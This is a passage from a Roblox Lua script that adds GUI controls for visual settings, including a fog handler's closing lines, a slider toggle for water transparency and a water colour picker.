                    FogEndChanged:Disconnect()
                    FogEndChanged = nil
                end
            end
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Contrast",
	Min = 0,
	Max = 31,
    Digits = 1,
	SliderDefault = Workspace:WaitForChild('Terrain').WaterTransparency,
    ToggleDefault = false,
    SliderFlag = 'WaterTransparency',
    ToggleFlag = 'ToggleWaterTransparency',
    SliderCallback = function(Value)
        _G.WaterTransparency = Value
    end,
	ToggleCallback = function(Value)
        if _G.WaterTransparency then
            Workspace:WaitForChild('Terrain').WaterTransparency = _G.WaterTransparency
        end
	end    
})

VisualsSection:CreateColorPicker({
    Name = 'Water Color',
    Default = Color3.fromRGB(Workspace:WaitForChild('Terrain').WaterColor.R*255, Workspace:WaitForChild('Terrain').WaterColor.G*255, Workspace:WaitForChild('Terrain').WaterColor.B*255),
    Flag = 'WaterColor',
    Callback = function(Value)
        Workspace:WaitForChild('Terrain').WaterColor = (Value)
    end
})
